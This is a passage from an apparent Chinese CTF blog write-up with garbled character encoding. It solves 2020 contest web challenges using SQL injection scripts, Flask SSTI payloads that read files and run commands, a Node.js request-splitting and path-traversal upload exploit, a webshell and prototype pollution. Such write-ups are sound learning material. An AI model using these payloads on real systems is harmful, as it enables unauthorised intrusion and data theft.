class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show columns from &#96;FlagHere&#96;;#</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagå­—æ®µ</p><p>æ ¹æ®ä¸€å¶é£˜é›¶å¤§ä½¬çš„blogï¼š<a href="https://skysec.top/2019/12/13/2019-FudanCTF-Writeup/" target="_blank" rel="noopener">https://skysec.top/2019/12/13/2019-FudanCTF-Writeup/</a> æ„é€ exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11&#39;; handler &#96;FlagHere&#96; open as &#96;tgt&#96;;handler &#96;tgt&#96; read next;--</span><br></pre></td></tr></table></figure><h4 id="2-3-Ezsqli"><a href="#2-3-Ezsqli" class="headerlink" title="2.3 Ezsqli"></a>2.3 Ezsqli</h4><ul><li>æ— inæ³¨è¡¨å </li></ul><p>å‚è€ƒï¼šèŠä¸€èŠbypass information_schema  <a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193512</a></p><ul><li>æ— union selectå’Œå­—æ®µåæ³¨æ•°æ®</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(2|(MID((select (select 1,1) &#x3D; (select * from f1ag_1s_h3r3_hhhhh limit 0,1)),1,1)&#x3D;0))</span><br><span class="line">åˆ—çš„æ•°é‡æœ‰ä¸¤ä¸ª</span><br><span class="line"></span><br><span class="line">(2|(select (select 1) &#x3D; (select count(*) from f1ag_1s_h3r3_hhhhh)))</span><br><span class="line">å…±æœ‰ä¸€æ¡è®°å½•</span><br><span class="line"></span><br><span class="line">(2|(select (select 1) &#x3D; (select id from f1ag_1s_h3r3_hhhhh)))</span><br><span class="line">è®°å½•æœ‰ä¸€ä¸ªå­—æ®µä¸ºid&#x3D;1</span><br></pre></td></tr></table></figure><p>å‚è€ƒè¿™ä¸ªï¼š<a href="https://nosec.org/home/detail/3830.html" target="_blank" rel="noopener">https://nosec.org/home/detail/3830.html</a></p><p>ä½¿ç”¨ <code>SELECT CONCAT(&quot;A&quot;, CAST(0 AS JSON))</code> æ¥å¦å…¶è¿”å›äºŒè¿›åˆ¶å­—ç¬¦ä¸²</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">#-*- coding:utf8 -*-</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;0365e3e590804cff9ae00511314e9994c04ae9b25b574cac.changame.ichunqiu.com&#x2F;index.php&quot;</span><br><span class="line"></span><br><span class="line">def exp1():</span><br><span class="line">    str1 &#x3D; (&#39;0123456789&#39;+string.ascii_letters+string.punctuation).replace(&quot;&#39;&quot;,&quot;&quot;).replace(&#39;&quot;&#39;,&#39;&#39;).replace(&#39;\\&#39;,&#39;&#39;)</span><br><span class="line">    flag &#x3D; &#39;&#39;</span><br><span class="line">    select &#x3D; &#39;select group_concat(table_name) from sys.x$schema_flattened_keys&#39;</span><br><span class="line">    for j in range(1,40):</span><br><span class="line">        for i in str1:</span><br><span class="line">            paylaod &#x3D; &quot;1&#x2F;**&#x2F;&amp;&amp;&#x2F;**&#x2F;(select substr((&#123;&#125;),&#123;&#125;,1))&#x3D;&#39;&#123;&#125;&#39;&quot;.format(select, j, i)</span><br><span class="line">            #print(paylaod)</span><br><span class="line">            data &#x3D; &#123;</span><br><span class="line">                &#39;id&#39;: paylaod,</span><br><span class="line">            &#125;</span><br><span class="line">            r &#x3D; requests.post(url,data&#x3D;data)</span><br><span class="line">            if &#39;Nu1L&#39; in r.text:</span><br><span class="line">                flag +&#x3D; i</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">def exp2():</span><br><span class="line">    str1 &#x3D; (&#39;-0123456789&#39;+string.ascii_uppercase+string.ascii_lowercase+string.punctuation).replace(&quot;&#39;&quot;,&quot;&quot;).replace(&#39;&quot;&#39;,&#39;&#39;).replace(&#39;\\&#39;,&#39;&#39;)</span><br><span class="line">    flag &#x3D; &#39;&#39;</span><br><span class="line">    flag_table_name &#x3D; &#39;f1ag_1s_h3r3_hhhhh&#39;</span><br><span class="line">    for j in range(1,39):</span><br><span class="line">        for i in str1:</span><br><span class="line">            i &#x3D; flag+i</span><br><span class="line">            paylaod &#x3D; &quot;1&amp;&amp;((select 1,concat(&#39;&#123;&#125;~&#39;,CAST(&#39;0&#39; as json))) &lt; (select * from &#123;&#125; limit 1))&quot;.format(i,flag_table_name)</span><br><span class="line">            print(paylaod)</span><br><span class="line">            data &#x3D; &#123;</span><br><span class="line">                &#39;id&#39;: paylaod,</span><br><span class="line">            &#125;</span><br><span class="line">            r &#x3D; requests.post(url,data&#x3D;data)</span><br><span class="line"></span><br><span class="line">            if &#39;Nu1L&#39; not in r.text:</span><br><span class="line">                flag&#x3D;i</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    exp1()</span><br><span class="line">    exp2()</span><br></pre></td></tr></table></figure><h3 id="ç¬¬ä¸‰å¤©"><a href="#ç¬¬ä¸‰å¤©" class="headerlink" title="ç¬¬ä¸‰å¤©"></a>ç¬¬ä¸‰å¤©</h3><h4 id="3-1-Flaskapp"><a href="#3-1-Flaskapp" class="headerlink" title="3.1 Flaskapp"></a>3.1 Flaskapp</h4><p>ssti+pinç çš„å®‰å…¨æœºåˆ¶</p><p>payloadå¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;æƒ³è¦è¯»å–çš„æ–‡ä»¶&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; </span><br><span class="line">æˆ–è€…</span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;æƒ³è¦è¯»å–çš„æ–‡ä»¶&#39;).read()&#125;&#125;</span><br><span class="line">æˆ–è€…</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#39;sys&#39;+&#39;tem&#39;](&#39;ls &#x2F;&#39;)&#125;&#125;</span><br><span class="line">åå¼¹shell</span><br></pre></td></tr></table></figure><p>æœ€åçš„è¯»å–flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(os.popen(&quot;ls -al &#x2F;&quot;).read())</span><br><span class="line">print(os.popen(&quot;cat &#x2F;this_is_the_flag.txt&quot;).read())</span><br></pre></td></tr></table></figure><h4 id="3-2-easy-thinking"><a href="#3-2-easy-thinking" class="headerlink" title="3.2 easy_thinking"></a>3.2 easy_thinking</h4><p>é¢„æœŸè§£æ³•ï¼š</p><p>å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç„¶ååœ¨ç™»å½•æ—¶å€™burpæŠ“åŒ…ï¼Œä¿®æ”¹sessionï¼Œæ³¨æ„é•¿åº¦å¿…é¡»æ˜¯32ä½ï¼Œå°†sessionæ”¹æˆ<code>.php</code>ç»“å°¾</p><p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200225223441544.png" alt></p><p>æœç´¢æ¡†è¾“å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åè®¿é—®</p><p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200225224532369.png" alt></p><p>å‰©ä¸‹å°±æ˜¯ç»•è¿‡ï¼Œå‚è€ƒ <a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">https://github.com/mm0r1/exploits</a></p><p>ä¿®æ”¹é‡Œé¢å‚æ•°ä¸ºpwn(â€œ/readflagâ€);å¾—åˆ°flag</p><p>å‚è€ƒèµ„æ–™ï¼š</p><blockquote><p><a href="http://p3rh4ps.top/index.php/2020/02/21/820-2-21-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b%e5%87%ba%e9%a2%98%e7%ac%94%e8%ae%b0/" target="_blank" rel="noopener">http://p3rh4ps.top/index.php/2020/02/21/820-2-21-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b%e5%87%ba%e9%a2%98%e7%ac%94%e8%ae%b0/</a></p><p><a href="https://www.gem-love.com/ctf/1669.html" target="_blank" rel="noopener">https://www.gem-love.com/ctf/1669.html</a></p><p><a href="http://p3rh4ps.top/index.php/2020/02/22/20-2-23-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b-%e5%89%8d%e4%b8%a4%e5%a4%a9-web-writeup/" target="_blank" rel="noopener">http://p3rh4ps.top/index.php/2020/02/22/20-2-23-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b-%e5%89%8d%e4%b8%a4%e5%a4%a9-web-writeup/</a></p><p><a href="http://p3rh4ps.top/index.php/2020/02/22/20-2-23-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b-%e5%89%8d%e4%b8%a4%e5%a4%a9-web-writeup/" target="_blank" rel="noopener">http://p3rh4ps.top/index.php/2020/02/22/20-2-23-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b-%e5%89%8d%e4%b8%a4%e5%a4%a9-web-writeup/</a></p><p><a href="https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/" target="_blank" rel="noopener">https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/</a></p></blockquote><h3 id="3-3-Node-Game"><a href="#3-3-Node-Game" class="headerlink" title="3.3 Node Game"></a>3.3 Node Game</h3><p>å¤ªèœäº†ï¼Œæ¯”èµ›çš„æ—¶å€™åšä¸å‡ºæ¥ï¼Œèµ›åè¿›è¡Œå¤ç›˜å­¦ä¹ QAQ</p><ol><li>é¢˜ç›®ç»™äº†æºä»£ç ï¼Œé¦–å…ˆè¿›è¡Œä»£ç å®¡è®¡</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">app.post(&#39;&#x2F;file_upload&#39;, function(req, res)&#123;</span><br><span class="line">    var ip &#x3D; req.connection.remoteAddress;</span><br><span class="line">    var obj &#x3D; &#123;</span><br><span class="line">        msg: &#39;&#39;,</span><br><span class="line">    &#125;</span><br><span class="line">    if (!ip.includes(&#39;127.0.0.1&#39;)) &#123;</span><br><span class="line">        obj.msg&#x3D;&quot;only admin&#39;s ip can use it&quot;</span><br><span class="line">        res.send(JSON.stringify(obj));</span><br><span class="line">        return </span><br><span class="line">    &#125;</span><br><span class="line">    fs.readFile(req.files[0].path, function(err, data)&#123;</span><br><span class="line">        if(err)&#123;</span><br><span class="line">            obj.msg &#x3D; &#39;upload failed&#39;;</span><br><span class="line">            res.send(JSON.stringify(obj));</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            var file_path &#x3D; &#39;&#x2F;uploads&#x2F;&#39; + req.files[0].mimetype +&quot;&#x2F;&quot;;</span><br><span class="line">            var file_name &#x3D; req.files[0].originalname</span><br><span class="line">            var dir_file &#x3D; __dirname + file_path + file_name</span><br><span class="line">            if(!fs.existsSync(__dirname + file_path))&#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    fs.mkdirSync(__dirname + file_path)</span><br><span class="line">                &#125; catch (error) &#123;</span><br><span class="line">                    obj.msg &#x3D; &quot;file type error&quot;;</span><br><span class="line">                    res.send(JSON.stringify(obj));</span><br><span class="line">                    return</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            try &#123;</span><br><span class="line">                fs.writeFileSync(dir_file,data)</span><br><span class="line">                obj &#x3D; &#123;</span><br><span class="line">                    msg: &#39;upload success&#39;,</span><br><span class="line">                    filename: file_path + file_name</span><br><span class="line">                &#125; </span><br><span class="line">            &#125; catch (error) &#123;</span><br><span class="line">                obj.msg &#x3D; &#39;upload failed&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">            res.send(JSON.stringify(obj));    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ä¼šé¦–å…ˆåˆ¤æ–­IPæ˜¯å¦æ¥è‡ª127.0.0.1ï¼Œè¿™é‡Œå°±éœ€è¦æ„é€ SSRFï¼Œç„¶åæ˜¯ä¿å­˜æ–‡ä»¶ï¼Œæ˜¯æ ¹æ®ä¼ è¿‡å»çš„ MIME ç±»å‹å’Œæ–‡ä»¶åç”Ÿæˆè·¯å¾„çš„ï¼Œè¿™é‡Œæ§åˆ¶æ–‡ä»¶ç±»å‹è¿›è¡Œç›®å½•ç©¿è¶Šè¿›è¡Œä»»æ„æ–‡ä»¶ä¸Šä¼ ã€‚</p><p>coreè·¯ç”±æ¥æ”¶q å‚æ•°ç„¶åæ‹¼æ¥åœ¨ /source? åé¢è¿›è¡Œè®¿é—®ï¼Œç„¶åä¼šæŠŠè®¿é—®ç»“æœæ˜¾ç¤ºå‡ºæ¥ï¼Œè¿™é‡Œå¯ä»¥è¿›è¡Œssrfè®¿é—®ï¼Œä½†æ˜¯å­˜åœ¨è¿‡æ»¤ã€‚nodejsç‰ˆæœ¬æç¤ºæ˜¯8.12.0ï¼Œå­˜åœ¨[request splitting](<a href="http://projects.webappsec.org/w/page/13246929/HTTP" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246929/HTTP</a> Request Splitting)æ¼æ´ï¼Œæ”»å‡»åŸç†å¯ä»¥å‚è€ƒè¿™ä¸ª <a href="https://xz.aliyun.com/t/2894#toc-2ç¨‹åºåœ¨åº•å±‚å¤„ç†çš„æ—¶å€™ä¼šèˆå¼ƒé«˜ä½çš„å­—ç¬¦" target="_blank" rel="noopener">https://xz.aliyun.com/t/2894#toc-2ç¨‹åºåœ¨åº•å±‚å¤„ç†çš„æ—¶å€™ä¼šèˆå¼ƒé«˜ä½çš„å­—ç¬¦</a>, åªä¿ç•™ä½ä½çš„å­—ç¬¦, ä¹Ÿå°±æ˜¯è¯´å‡å¦‚æˆ‘ä»¬ä¼ å…¥<code>chr(0xffa0)</code>å¤„ç†åä¼šè¢«æˆªæ–­ä¸º<code>chr(0xa0)</code>ï¼Œå¹¶ä¸”è¿™ä¸ª<code>0xff</code>å¯æ›´æ¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">app.get(&#39;&#x2F;core&#39;, function(req, res) &#123;</span><br><span class="line">    var q &#x3D; req.query.q;</span><br><span class="line">    var resp &#x3D; &quot;&quot;;</span><br><span class="line">    if (q) &#123;</span><br><span class="line">        var url &#x3D; &#39;http:&#x2F;&#x2F;localhost:8081&#x2F;source?&#39; + q</span><br><span class="line">        console.log(url)</span><br><span class="line">        var trigger &#x3D; blacklist(url);</span><br><span class="line">        if (trigger &#x3D;&#x3D;&#x3D; true) &#123;</span><br><span class="line">            res.send(&quot;&lt;p&gt;error occurs!&lt;&#x2F;p&gt;&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                http.get(url, function(resp) &#123;</span><br><span class="line">                    resp.setEncoding(&#39;utf8&#39;);</span><br><span class="line">                    resp.on(&#39;error&#39;, function(err) &#123;</span><br><span class="line">                    if (err.code &#x3D;&#x3D;&#x3D; &quot;ECONNRESET&quot;) &#123;</span><br><span class="line">                     console.log(&quot;Timeout occurs&quot;);</span><br><span class="line">                     return;</span><br><span class="line">                    &#125;</span><br><span class="line">                   &#125;);</span><br><span class="line"></span><br><span class="line">                    resp.on(&#39;data&#39;, function(chunk) &#123;</span><br><span class="line">                        try &#123;</span><br><span class="line">                         resps &#x3D; chunk.toString();</span><br><span class="line">                         res.send(resps);</span><br><span class="line">                        &#125;catch (e) &#123;</span><br><span class="line">                           res.send(e.message);</span><br><span class="line">                        &#125;</span><br><span class="line"> </span><br><span class="line">                    &#125;).on(&#39;error&#39;, (e) &#x3D;&gt; &#123;</span><br><span class="line">                         res.send(e.message);&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; catch (error) &#123;</span><br><span class="line">                console.log(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        res.send(&quot;search param &#39;q&#39; missing!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>é¦–é¡µæœ‰ä¸€å—éƒ¨åˆ†æ¥å—actionå‚æ•°ï¼Œå¹¶æ‹¼æ¥åˆ° template ä¸‹çš„ç›®å½•ç”¨ pug å¼•æ“æ¸²æŸ“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.get(&#39;&#x2F;&#39;, function(req, res) &#123;</span><br><span class="line">    var action &#x3D; req.query.action?req.query.action:&quot;index&quot;;</span><br><span class="line">    if( action.includes(&quot;&#x2F;&quot;) || action.includes(&quot;\\&quot;) )&#123;</span><br><span class="line">        res.send(&quot;Errrrr, You have been Blocked&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    file &#x3D; path.join(__dirname + &#39;&#x2F;template&#x2F;&#39;+ action +&#39;.pug&#39;);</span><br><span class="line">    var html &#x3D; pug.renderFile(file);</span><br><span class="line">    res.send(html);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨pugæ–‡æ¡£ä¸­çš„åŒ…å«includeå¯ä»¥å°è¯•è¯»å–æ ¹ç›®å½•flag  å‚è€ƒï¼š<a href="https://pugjs.org/zh-cn/language/includes.html" target="_blank" rel="noopener">åŒ…å« Include</a></p><ol start="3"><li>å‚è€ƒèµµå¸ˆå‚…çš„è„šæœ¬å‘åŒ…ï¼š</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;&#39;&#39; HTTP&#x2F;1.1</span><br><span class="line">Host: x</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">POST &#x2F;file_upload HTTP&#x2F;1.1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;--------------------------1403693673106942081532243149</span><br><span class="line">Connection: keep-alive</span><br><span class="line">cache-control: no-cache</span><br><span class="line">Host: x</span><br><span class="line">Content-Length: 292</span><br><span class="line"></span><br><span class="line">----------------------------1403693673106942081532243149</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;test.pug&quot;</span><br><span class="line">Content-Type: &#x2F;..&#x2F;template</span><br><span class="line"></span><br><span class="line">doctype html</span><br><span class="line">html</span><br><span class="line">  head</span><br><span class="line">    style</span><br><span class="line">      include ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt</span><br><span class="line"></span><br><span class="line">----------------------------1403693673106942081532243149--</span><br><span class="line"></span><br><span class="line">GET &#x2F;flag HTTP&#x2F;1.1</span><br><span class="line">Host: x</span><br><span class="line">Connection: close</span><br><span class="line">x:&#39;&#39;&#39;</span><br><span class="line">payload &#x3D; payload.replace(&quot;\n&quot;, &quot;\r\n&quot;)</span><br><span class="line">payload &#x3D; &#39;&#39;.join(chr(int(&#39;0xff&#39; + hex(ord(c))[2:].zfill(2), 16)) for c in payload)</span><br><span class="line">print(payload)</span><br><span class="line">r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;707e299e-f951-4d9b-ac8a-bc2c3de5a2b8.node3.buuoj.cn&#x2F;core?q&#x3D;&#39; + urllib.parse.quote(payload))</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>æœ€åè®¿é—®/?action=testå¾—åˆ°flag</p><p>å‚è€ƒèµ„æ–™ï¼š</p><blockquote><p><a href="https://www.zhaoj.in/read-6462.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6462.html</a></p><p><a href="https://xz.aliyun.com/t/2894#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/2894#toc-2</a></p><p><a href="http://blog.5am3.com/2020/02/11/ctf-node1/" target="_blank" rel="noopener">http://blog.5am3.com/2020/02/11/ctf-node1/</a></p></blockquote><h4 id="3-4-EzExpress"><a href="#3-4-EzExpress" class="headerlink" title="3.4 EzExpress"></a>3.4 EzExpress</h4><p>èµ›åå¤ç›˜å†™çš„ï¼Œå­¦ä¹ äº†ä¸€ä¸‹JavaScriptåŸå‹é“¾æ±¡æŸ“</p><ol><li>æç¤º<a href="http://www.zipæºä»£ç ï¼Œè®¿é—®ä¸‹è½½è¿›è¡Œå®¡è®¡" target="_blank" rel="noopener">www.zipæºä»£ç ï¼Œè®¿é—®ä¸‹è½½è¿›è¡Œå®¡è®¡</a></li></ol><p>å¯¹routes ä¸‹è·¯ç”±æ–‡ä»¶è¿›è¡Œå®¡è®¡ï¼Œå¼€å¤´å‡ºç°merge å’Œ cloneï¼Œå­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´</p><p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200318213223562.png" alt></p><p>åœ¨actionè·¯ç”±å‘ç°åªæœ‰ç”¨æˆ·ä¸ºadminæ‰èƒ½è§¦å‘åŸå‹é“¾æ±¡æŸ“</p><p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200318213453879.png" alt></p><p>ä½†æ˜¯æ³¨å†Œçš„æ—¶å€™ä¸èƒ½å¸¦æœ‰admin</p><p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200318213721947.png" alt></p><ol start="2"><li><p>å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼Œ<a href="https://xz.aliyun.com/t/7184#toc-11ï¼Œåˆ©ç”¨javascriptå¤§å°å†™ç‰¹æ€§è¿›è¡Œç»•è¿‡ï¼Œæ³¨å†Œadm`Ä±`n" target="_blank" rel="noopener">https://xz.aliyun.com/t/7184#toc-11ï¼Œåˆ©ç”¨javascriptå¤§å°å†™ç‰¹æ€§è¿›è¡Œç»•è¿‡ï¼Œæ³¨å†Œadm`Ä±`n</a></p></li><li><p>è®¿é—®actionæŠ“åŒ…ï¼Œæ„é€ æ¶æ„è¯·æ±‚,æ³¨æ„è¦è®¾ç½®<code>Content-Type: application/json</code></p></li></ol><p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200318214151607.png" alt></p><ol start="4"><li>è®¿é—®<code>/info</code>è§¦å‘åŸå‹é“¾ï¼Œè®¿é—®<code>/flag</code>ä¸‹è½½å³å¯</li></ol><p>å‚è€ƒèµ„æ–™ï¼š</p><blockquote><p><a href="https://glotozz.github.io/2020/02/25/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" target="_blank" rel="noopener">https://glotozz.github.io/2020/02/25/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a></p><p><a href="https://www.zhaoj.in/read-6462.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6462.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gyctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo å®ç°å¤šç»ˆç«¯åŒæ­¥</title>
      <link href="/2020/03/18/Hexo-%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BB%88%E7%AB%AF%E5%90%8C%E6%AD%A5/"/>
